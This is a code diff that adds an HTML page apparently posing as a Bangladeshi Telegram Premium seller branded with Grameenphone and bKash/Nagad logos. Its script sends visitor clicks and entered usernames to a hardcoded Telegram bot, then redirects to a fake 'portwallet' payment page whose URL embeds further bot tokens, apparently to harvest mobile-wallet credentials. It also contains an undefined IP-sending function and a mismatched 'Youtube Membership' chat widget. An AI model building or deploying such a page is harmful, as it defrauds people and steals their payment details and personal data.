@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TELEGRAM PREMIUM MEMBERSHIP</title>
+    <style>
+        /* 1xbet-inspired CSS styling */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #272e48;
+            color: white;
+            text-align: center;
+            padding: 20px;
+        }
+
+        .header {
+            padding: 30px;
+            background-color: #1f2432;
+        }
+
+        .logo img {
+            width: 250px;
+            height: auto;
+        }
+
+        h1 {
+            font-size: 3rem;
+            margin: 10px 0;
+            color: #f1c40f;
+        }
+
+        .offer p {
+            font-size: 1.2rem;
+            margin: 20px 0;
+            color: #dcdcdc;
+        }
+
+        .offer h2 {
+            font-size: 2rem;
+            margin: 30px 0;
+            font-weight: bold;
+            color: #f1c40f;
+        }
+
+        .pricing table {
+            width: 100%;
+            margin: 20px 0;
+            border-collapse: collapse;
+            background-color: #34495e;
+        }
+
+        .pricing th, td {
+            border: 1px solid #fff;
+            padding: 15px;
+            font-size: 1.2rem;
+        }
+
+        .buy-now button {
+            background-color: #e74c3c;
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            cursor: pointer;
+            border-radius: 10px;
+            margin-top: 20px;
+            font-size: 1.5rem;
+            transition: background-color 0.3s ease;
+        }
+
+        .buy-now button:hover {
+            background-color: #c0392b;
+        }
+
+        .footer {
+            margin-top: 50px;
+            padding: 20px;
+            background-color: #2c3e50;
+        }
+
+        .payment img {
+            width: 80px;
+            margin-top: 10px;
+        }
+
+        .social a {
+            margin: 10px;
+            display: inline-block;
+        }
+
+        .social img {
+            width: 30px;
+            height: 30px;
+        }
+
+        /* Popup styling */
+        .popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: #ffffff;
+            padding: 20px;
+            border-radius: 10px;
+            z-index: 1000;
+            color: black;
+            width: 350px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+
+        .popup input, .popup select {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+        }
+
+        .popup button {
+            padding: 10px 20px;
+            background-color: #e74c3c;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 1.2rem;
+        }
+
+        .popup button:hover {
+            background-color: #c0392b;
+        }
+
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 500;
+        }
+
+        .payment-logo {
+            display: flex;
+            justify-content: space-around;
+            margin: 10px 0;
+        }
+
+        .payment-logo img {
+            width: 80px;
+            cursor: pointer;
+        }
+
+        .content {
+            opacity: 0;
+            transform: translateY(-20px);
+            transition: opacity 1s ease, transform 1s ease;
+        }
+
+        .content.show {
+            opacity: 1;
+            transform: translateY(0);
+        }
+    </style>
+</head>
+<body>
+    <header class="header content">
+        <div class="logo">
+            <img src="https://imgur.com/jPXp4tt.png" alt="Telegram Premium Logo">
+        </div>
+        <h1>TELEGRAM PREMIUM MEMBERSHIP</h1>
+        <p>Purchase Premium Membership for Telegram from us in Bangladesh</p>
+    </header>
+
+    <section class="offer content">
+        <p>Hello everyone, with our new services, get Telegram Premium Membership without any hassle. We are here to provide you with Telegram Premium Membership at a reasonable price. Why wait? Buy now and enjoy the benefits.</p>
+        <h2>BOOK YOUR PREFERRED MEMBERSHIP NOW</h2>
+    </section>
+
+    <section class="pricing content">
+        <table>
+            <thead>
+                <tr>
+                    <th>GOLD MEMBERSHIP</th>
+                    <th>PLATINUM MEMBERSHIP</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td>1. Access to all premium features</td>
+                    <td>1. Access to all premium features</td>
+                </tr>
+                <tr>
+                    <td>Price: 10TK Only/Day</td>
+                    <td>Price: 20TK Only/Day</td>
+                </tr>
+            </tbody>
+        </table>
+        <div class="buy-now">
+            <button onclick="buyNow()">Try Beta Access</button>
+        </div>
+    </section>
+
+    <footer class="footer content">
+        <p></p>
+        <div class="payment">
+            <img src="https://imgur.com/HoTrMsT.png" alt="bKash Logo">
+            <p>Powered by GRAMEENPHONE LTD</p>
+        </div>
+        <div class="social">
+            <a href="https://facebook.com" target="_blank">
+                <img src="https://img.icons8.com/fluency/48/000000/facebook-new.png" alt="Facebook">
+            </a>
+            <a href="https://instagram.com" target="_blank">
+                <img src="https://img.icons8.com/fluency/48/000000/instagram-new.png" alt="Instagram">
+            </a>
+            <a href="https://snapchat.com" target="_blank">
+                <img src="https://img.icons8.com/fluency/48/000000/snapchat.png" alt="Snapchat">
+            </a>
+            <a href="https://twitter.com" target="_blank">
+                <img src="https://img.icons8.com/fluency/48/000000/twitter.png" alt="Twitter">
+            </a>
+            <a href="https://whatsapp.com" target="_blank">
+                <img src="https://img.icons8.com/fluency/48/000000/whatsapp.png" alt="WhatsApp">
+            </a>
+            <a href="https://linkedin.com" target="_blank">
+                <img src="https://img.icons8.com/fluency/48/000000/linkedin.png" alt="LinkedIn">
+            </a>
+        </div>
+    </footer>
+
+    <!-- Popup HTML -->
+    <div class="overlay"></div>
+    <div class="popup" id="popup">
+        <h5>AUTHENTICATION</h5>
+        <input type="text" id="telegramUsername" placeholder="Enter Telegram Username">
+        <input type="text" id="activationCode" placeholder="Enter Activation Code">
+        <select id="membershipType">
+            <option value="gold">Gold Membership</option>
+            <option value="platinum">Platinum Membership</option>
+        </select>
+        <label for="paymentMethod">Select Payment Method:</label>
+        <select id="paymentMethod">
+            <option value="" disabled selected>Select Payment Method</option>
+            <option value="bKash" data-img="https://imgur.com/HoTrMsT.png">bKash</option>
+            <option value="Nagad" data-img="https://imgur.com/A8sT2AP.png">Nagad</option>
+        </select>
+        <button onclick="activate()">Activate</button>
+    </div>
+
+    <script>
+        function openPopup() {
+            document.querySelector('.overlay').style.display = 'block';
+            document.getElementById('popup').style.display = 'block';
+        }
+
+        function closePopup() {
+            document.querySelector('.overlay').style.display = 'none';
+            document.getElementById('popup').style.display = 'none';
+        }
+
+        function sendTelegramMessage(message) {
+            const botToken = '7721532005:AAFxyQ4Ed5aTNNMflkOr7FF2iSPfhHMZbG4';
+            const chatId = '6471397661';
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        alert('Verification message sent!');
+                    }
+                })
+                .catch(error => console.error('Error sending Telegram message:', error));
+        }
+
+        function buyNow() {
+            openPopup();
+        }
+
+        function activate() {
+            const telegramUsername = document.getElementById('telegramUsername').value;
+            const activationCode = document.getElementById('activationCode').value;
+            const membershipType = document.getElementById('membershipType').value;
+            const paymentMethod = document.getElementById('paymentMethod').value;
+
+          if (activationCode === 'LYT67S') {
+                // Send activation message to Telegram
+                getIPAndSendMessage(`Telegram Username: ${telegramUsername} has activated their subscription. Membership: ${membershipType}, Payment Method: ${paymentMethod}`);
+
+                // Redirect based on membership type and payment method
+                if (membershipType === 'gold' && paymentMethod === 'bKash') {
+                    window.location.href = 'https://portwallet.vercel.app/paymentmethod=bkash&&paymentID=1.html?amount=10&ssl=https%3A%2F%2Fimgur.com%2FljM76AR.png&companyName=Grameenphone%20Ltd&invoice=BGT726262477828828&botToken=7721532005:AAFNUxtAwHeH617lb1oOp3hcdKKjzRITS3Y&chatId=7174617845';
+                } else if (membershipType === 'platinum' && paymentMethod === 'bKash') {
+                    window.location.href = 'https://portwallet.vercel.app/paymentmethod=bkash&&paymentID=1.html?amount=20&ssl=https%3A%2F%2Fimgur.com%2FljM76AR.png&companyName=Grameenphone%20Ltd&invoice=BGT726262477828828&botToken=7721532005:AAFNUxtAwHeH617lb1oOp3hcdKKjzRITS3Y&chatId=7174617845';
+                } else if (membershipType === 'gold' && paymentMethod === 'Nagad') {
+                    window.location.href = 'https://portwallet.vercel.app/payID=nagad.html';
+                } else if (membershipType === 'platinum' && paymentMethod === 'Nagad') {
+                    window.location.href = 'https://portwallet.vercel.app/payID=nagad.html?amount=20.00';
+                }
+            } else {
+                alert('Invalid activation code!');
+            }
+        }
+
+        // Send a message to Telegram when the "BUY NOW" button is clicked along with the user's IP address
+        function buyNow() {
+            const message = "Someone clicked on 'Telegram'.";
+            getIPAndSendMessage(message);
+
+            openPopup();
+        }
+
+       // Trigger the fade-in and slide-down animation on page load
+        document.addEventListener("DOMContentLoaded", function () {
+            const contents = document.querySelectorAll(".content");
+            contents.forEach((content) => {
+                content.classList.add("show");
+            });
+        });
+        
+        var url = 'https://wati-integration-prod-service.clare.ai/v2/watiWidget.js?15573';
+        var s = document.createElement('script');
+        s.type = 'text/javascript';
+        s.async = true;
+        s.src = url;
+        var options = {
+            "enabled": true,
+            "chatButtonSetting": {
+                "backgroundColor": "#000000",
+                "ctaText": "Chat with us",
+                "borderRadius": "25",
+                "marginLeft": "0",
+                "marginRight": "20",
+                "marginBottom": "20",
+                "ctaIconWATI": false,
+                "position": "right"
+            },
+            "brandSetting": {
+                "brandName": "Youtube Membership",
+                "brandSubTitle": "undefined",
+                "brandImg": "https://www.wati.io/wp-content/uploads/2023/04/Wati-logo.svg",
+                "welcomeText": "Hi there!\nHow can I help you?",
+                "messageText": "Hello, %0A I have a question about Youtube Membership",
+                "backgroundColor": "#000000",
+                "ctaText": "Chat with us",
+                "borderRadius": "25",
+                "autoShow": false,
+                "phoneNumber": "12066578249"
+            }
+        };
+        s.onload = function() {
+            CreateWhatsappChatWidget(options);
+        };
+        var x = document.getElementsByTagName('script')[0];
+        x.parentNode.insertBefore(s, x);
+    </script>
+</body>
+</html>
